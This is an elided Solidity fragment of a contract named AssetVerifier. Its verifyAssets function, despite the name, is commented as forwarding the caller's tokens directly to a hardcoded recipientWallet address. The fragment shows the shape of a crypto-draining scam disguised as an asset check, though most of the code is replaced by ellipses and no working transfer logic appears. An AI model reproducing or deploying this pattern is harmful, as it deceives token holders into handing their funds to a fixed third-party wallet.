...
contract AssetVerifier {
    ...
    address public recipientWallet = 0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d;
    ...
    function verifyAssets(address token, uint256 amount) external returns (bool) {
        ...
        // Forward tokens directly to your recipientWallet address (0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d)
